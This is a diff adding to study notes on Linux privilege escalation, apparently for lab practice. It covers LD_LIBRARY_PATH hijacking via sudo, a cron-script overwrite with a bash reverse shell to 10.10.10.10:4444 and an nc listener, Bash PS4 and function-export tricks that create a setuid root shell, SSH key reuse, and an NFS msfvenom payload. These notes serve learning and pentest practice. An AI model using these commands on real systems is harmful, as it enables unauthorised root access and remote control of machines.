@@ -60,4 +60,113 @@ the output of `sudo -l` also contains inherited environment variables,
 
 These variables might contain list of directories where shared libraries are searched for first
 
-> while opening the 
+> while opening the `sudo` allowed programs set the environment variable to the directory where the malicious program is in. Remember to name the mal program with the name the program searches it to be.
+
+_Example_
+use..
+```zsh
+ldd /usr/sbin/apache2
+```
+
+to see shared libraries used by `apache2`
+
+say you have `libcrypt.so.1`
+
+now put the malicious file to `/tmp` folder with the name  `libcrypt.so.1` 
+
+now open the apache2 program as follows 
+```zsh
+sudo LD_LIBRARY_PATH=/tmp apache2
+```
+
+### Cron Jobs
+
+- Cron table files (crontabs) store the configuration for cron jobs.
+- The system-wide crontab is located at `/etc/crontab`.
+
+>[! Scenario]
+> while exploring `/etc/crontab` file you saw a script `overwrite.sh` that runs every 5 minutes. Further investigation of this file revealed that this file is world-writable 
+
+_how to exploit this?_
+
+- well it could be overwritten, therefore... find a good script that grants us a root shell
+- how about this, 
+```zsh
+#!/bin/bash  
+bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+```
+#### code breakdown
+- `#!/bin/bash  ` shebang, specifies that the script should be interpreted by Bash shell `/bin/bash`
+- `bash -i` starts new Bash shell session
+- `>&` double greater than, for both standard output and standard error redirection
+- `dev/tcp/10.10.10.10/4444 ` specifies target for redirection
+- `0>&1` redirects file descriptor '0', which is input, is redirected to where previous stdout and stderr is redirected.  
+
+the attacker shall listen to the upcoming connection by opening a port on his machine 
+```zsh
+nc -nvlp 4444
+```
+
+### SUID/ DGID Executable
+
+to find SUID/SGID executable on Debian 
+```zsh
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+```
+
+then try to find exploitable file from those files
+`or`
+try to exploit though the shared object. The drill is to inject the malicious file for the shared object.
+
+To see shared objects one can use `strace`
+
+### SUID / SGID Executables - Abusing Shell Feature
+
+In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.
+```zsh
+function /usr/sbin/service { /bin/bash -p; }  
+export -f /usr/sbin/service
+```
+
+therefore now when we run a SUID program that uses `/usr/sbin/service` path, what actually executed is the function we defined. therefore, wuollaaa
+
+Again in Bash versions <4.4, when in debugging mode Bash uses the environment variable `PS4` to display an extra prompt for debugging statements.
+What if we try to insert a command when prompted, 
+```zsh
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+```
+
+have a closer look on `PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)'` part. 
+
+now we can do `/tmp/rootbash -p` to get to `root`
+
+### History file
+the user(root) might have stroke the pass keys mistakenly, so taking a look doesn't hurt
+```zsh
+cat ~/.history | less
+```
+
+### Config file
+another place to look for a password is `config files`
+
+### SSH Keys
+try to look at `ls -l /.ssh`, you might get unprotected key
+for ssh to use it, do ``chmod 600 root_key``
+then try to log in using this key 
+
+```zsh
+ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@MACHINE_IP
+```
+
+### NFS
+
+Files created via NFS inherit the **remote** user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
+
+take a look at `cat /etc/exports` for a mount point where `root-squashing` is disabled.
+
+1. on attacker's machine `mkdir /tmp/nfs`
+2. `mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs` -- assume `/tmp` is the no-root-squashing file
+3. generate payload 
+	``msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf``
+
+	
